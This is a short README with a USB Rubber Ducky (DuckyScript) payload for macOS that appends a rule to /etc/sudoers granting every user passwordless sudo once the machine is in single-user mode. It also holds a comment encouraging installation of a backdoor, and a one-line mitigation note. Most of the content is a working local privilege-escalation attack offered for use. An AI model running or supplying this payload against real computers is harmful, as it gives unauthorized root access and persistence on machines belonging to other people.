**Author: Jesse Wallace ([@c0deous](https://twitter.com/c0deous))**
**[c0deo.us](https://c0deo.us/)**

This script adds a line into /etc/sudoers that enables sudo for ALL users **without requiring a password.**  Only requirement is a reboot into [single user mode](https://support.apple.com/en-us/HT201573).

**Mitigation**

Setup a [firmware password](https://support.apple.com/en-us/HT204455) or enable [FileVault](https://support.apple.com/en-us/HT204837) disk encryption.

This method was tested on macOS 10.7.5, 10.11, 10.12 but should work for all versions. (?)

```
REM MacOS AllSudo
REM Enables Sudo access for all users without a password
REM First boot the machine into single user mode - https://support.apple.com/en-us/HT201573
REM By Jesse Wallace (@c0deous)
REM https://c0deo.us/
DELAY 1000
STRING mount -uw / && chmod 755 /etc/sudoers && echo 'ALL    ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers && chmod 440 /etc/sudoers && shutdown -h now
ENTER
REM Now would be a great time to install a backdoor.  Ez root ;3
REM TODO Use visudo for edits (unconfirmed if working)
```

**Todo**: Having issues scripting a way to boot into single user mode with the duck.  If you'd like to help please DM me on Twitter (@c0deous)